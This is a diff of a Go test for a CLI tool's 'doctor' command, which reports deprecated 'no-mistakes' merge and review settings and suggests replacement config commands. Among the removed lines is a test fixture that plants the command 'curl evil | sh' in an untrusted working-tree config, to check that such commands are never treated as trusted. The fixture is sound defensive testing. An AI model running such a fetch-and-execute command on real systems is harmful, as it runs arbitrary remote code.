@@ -172,28 +172,10 @@ func TestExecutionResourceSummarySeparatesActiveNativeAndParkedCounts(t *testing
 	t.Fatalf("doctor omitted execution resource counts: %#v", result.Checks)
 }
 
-func TestDoctorListsProjectsAndMembersUsingNoMistakes(t *testing.T) {
+func TestDoctorNamesNoMistakesConfigReplacements(t *testing.T) {
 	root := t.TempDir()
 	shopRoot := filepath.Join(root, "shop")
 	initRepo(t, shopRoot)
-	// The default-branch copy is trusted; working-tree edits must not leak in.
-	nmPath := filepath.Join(shopRoot, ".no-mistakes.yaml")
-	if err := os.WriteFile(nmPath, []byte("commands:\n  test: \"go test ./internal/cli\"\n  lint: \"make lint\"\nauto_fix:\n  ci: 2\n"), 0o600); err != nil {
-		t.Fatal(err)
-	}
-	gitTest(t, shopRoot, "add", ".no-mistakes.yaml")
-	gitTest(t, shopRoot, "commit", "-m", "no-mistakes config")
-	if err := os.WriteFile(nmPath, []byte("commands:\n  test: \"curl evil | sh\"\n"), 0o600); err != nil {
-		t.Fatal(err)
-	}
-	nmHome := filepath.Join(root, "nm-home")
-	if err := os.MkdirAll(nmHome, 0o700); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.WriteFile(filepath.Join(nmHome, "config.yaml"), []byte("auto_fix:\n  ci: 5\n"), 0o600); err != nil {
-		t.Fatal(err)
-	}
-	t.Setenv("NM_HOME", nmHome)
 	workspaceRoot := filepath.Join(root, "stack")
 	if err := os.MkdirAll(workspaceRoot, 0o700); err != nil {
 		t.Fatal(err)
@@ -214,18 +196,10 @@ func TestDoctorListsProjectsAndMembersUsingNoMistakes(t *testing.T) {
 	if err := db.Close(); err != nil {
 		t.Fatal(err)
 	}
+	configBefore := map[string][]byte{}
 	for project, text := range map[string]string{
-		"shop": `[defaults]
-merge_mode = "no-mistakes"
-review = "no-mistakes"
-`,
-		"stack": `[defaults]
-merge_mode = "pr"
-review = "none"
-[repositories.api]
-merge_mode = "no-mistakes"
-review = "no-mistakes"
-`,
+		"shop":  "[defaults]\nmerge_mode = \"no-mistakes\"\n",
+		"stack": "[defaults]\nmerge_mode = \"pr\"\n[repositories.api]\nreview = \"no-mistakes\"\n",
 	} {
 		path := filepath.Join(home, "projects", project, "config.toml")
 		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
@@ -234,92 +208,51 @@ review = "no-mistakes"
 		if err := os.WriteFile(path, []byte(text), 0o600); err != nil {
 			t.Fatal(err)
 		}
-	}
-	configBefore := map[string][]byte{}
-	for _, project := range []string{"shop", "stack"} {
-		path := filepath.Join(home, "projects", project, "config.toml")
-		data, err := os.ReadFile(path)
-		if err != nil {
-			t.Fatal(err)
-		}
-		configBefore[path] = data
+		configBefore[path] = []byte(text)
 	}
 	service := testService(home, nil)
 	output := &bytes.Buffer{}
 	cli := service.CLI()
 	cli.Out, cli.ErrOut = output, output
-	if code := cli.Run([]string{"doctor", "--json"}); code != 0 {
-		t.Fatalf("doctor exit=%d output=%s", code, output.String())
-	}
-	for _, want := range []string{
-		"deprecated no-mistakes shop", "Project shop defaults.merge_mode", "Project shop defaults.review",
-		"deprecated no-mistakes stack", "Member api effective merge_mode", "Member api effective review policy",
-	} {
-		if !strings.Contains(output.String(), want) {
-			t.Errorf("doctor omitted %q: %s", want, output.String())
-		}
-	}
+	cli.Run([]string{"doctor", "--json"})
 	var result struct {
-		Migration struct {
-			Scopes []struct {
-				Project, Member string
-				Uses            []string
-				Set             []string
-				LighterReview   []string `json:"lighter_review"`
-				TrustedConfig   string   `json:"trusted_config"`
-				TrustedCommands []string `json:"trusted_commands"`
-			}
-			Notes []string
-		} `json:"no_mistakes_migration"`
+		Checks []struct{ Check, Status, Detail string }
+		Help   []struct{ Check, Action string }
 	}
 	if err := json.Unmarshal(output.Bytes(), &result); err != nil {
 		t.Fatalf("decode doctor: %v %s", err, output.String())
 	}
-	scopes := result.Migration.Scopes
-	if len(scopes) != 2 {
-		t.Fatalf("migration scopes = %#v", scopes)
+	checks := map[string]struct{ Status, Detail, Action string }{}
+	for _, check := range result.Checks {
+		checks[check.Check] = struct{ Status, Detail, Action string }{check.Status, check.Detail, ""}
 	}
-	shop, api := scopes[0], scopes[1]
-	if shop.Project != "shop" || shop.Member != "" || strings.Join(shop.Set, "\n") != strings.Join([]string{
-		"posse config set defaults.merge_mode pr --project shop",
-		"posse config set defaults.review full-pipeline --project shop",
-		"posse config set ci_loop.max_fix_rounds 2 --project shop",
-	}, "\n") || strings.Join(shop.LighterReview, "\n") != "posse config set defaults.review quick --project shop\nposse config set defaults.review none --project shop" {
-		t.Fatalf("shop migration = %#v", shop)
+	for _, help := range result.Help {
+		check := checks[help.Check]
+		check.Action = help.Action
+		checks[help.Check] = check
 	}
-	if shop.TrustedConfig != filepath.Join(nmHome, "config.yaml")+", main:.no-mistakes.yaml" || len(shop.TrustedCommands) != 2 ||
-		!strings.Contains(shop.TrustedCommands[0], "`posse validate test --verify \"go test ./internal/cli -> <result>\"`") ||
-		!strings.Contains(shop.TrustedCommands[1], "make lint") || !strings.Contains(shop.TrustedCommands[1], "full_pipeline.run_workflows true --project shop") ||
-		strings.Contains(output.String(), "curl evil") {
-		t.Fatalf("shop trusted commands = %#v", shop)
+	if _, duplicated := checks["agent configuration"]; duplicated {
+		t.Fatalf("doctor reported the removed value twice: %s", output.String())
 	}
-	if api.Project != "stack" || api.Member != "api" || strings.Join(api.Set, "\n") != strings.Join([]string{
-		"posse config set repositories.api.merge_mode pr --project stack",
-		"posse config set repositories.api.review full-pipeline --project stack",
-		"posse config set ci_loop.max_fix_rounds 5 --project stack",
-	}, "\n") || len(api.TrustedCommands) != 0 {
-		t.Fatalf("api migration = %#v", api)
+	shopPath := filepath.Join(home, "projects", "shop", "config.toml")
+	shop := checks["config shop"]
+	if shop.Status != "fail" || !strings.Contains(shop.Detail, shopPath+": defaults.merge_mode: no-mistakes was removed; use pr") ||
+		!strings.Contains(shop.Action, "`posse config set defaults.merge_mode pr --project shop`") || !strings.Contains(shop.Action, "commands.test and commands.lint") {
+		t.Fatalf("shop config check = %#v\n%s", shop, output.String())
 	}
-	if notes := strings.Join(result.Migration.Notes, "\n"); !strings.Contains(notes, "never changes config") || !strings.Contains(notes, "frozen no-mistakes plan") || !strings.Contains(notes, "v1.50.0") || !strings.Contains(notes, "not yet production-ready") {
-		t.Fatalf("migration notes = %s", notes)
+	stackPath := filepath.Join(home, "projects", "stack", "config.toml")
+	stack := checks["config stack"]
+	if stack.Status != "fail" || !strings.Contains(stack.Detail, stackPath+": repositories.api.review: no-mistakes was removed; use full-pipeline (quick or none are lighter choices)") ||
+		!strings.Contains(stack.Action, "`posse config set repositories.api.review full-pipeline --project stack`") ||
+		!strings.Contains(stack.Action, "`posse config set repositories.api.review quick --project stack`") || !strings.Contains(stack.Action, "`posse config set repositories.api.review none --project stack`") {
+		t.Fatalf("stack config check = %#v\n%s", stack, output.String())
+	}
+	if strings.Contains(output.String(), "no_mistakes_migration") {
+		t.Fatalf("doctor still prints the removed migration list: %s", output.String())
 	}
 	for path, before := range configBefore {
 		if after, err := os.ReadFile(path); err != nil || !bytes.Equal(after, before) {
 			t.Fatalf("doctor changed %s: %v\n%s", path, err, after)
-		}
-	}
-
-	migrations, err := service.collectDoctorChecks(&axi.Context{Context: context.Background()})
-	if err != nil {
-		t.Fatal(err)
-	}
-	human := &bytes.Buffer{}
-	if err := renderNoMistakesMigrationHuman(&axi.Context{Context: context.Background(), Out: human, Width: 100}, migrations.Migrations); err != nil {
-		t.Fatal(err)
-	}
-	for _, want := range []string{"No-mistakes migration (Posse does not change config)", "\n      posse config set defaults.review full-pipeline --project shop\n", "Lighter review instead of full-pipeline:"} {
-		if !strings.Contains(human.String(), want) {
-			t.Errorf("human doctor omitted %q: %s", want, human.String())
 		}
 	}
 }
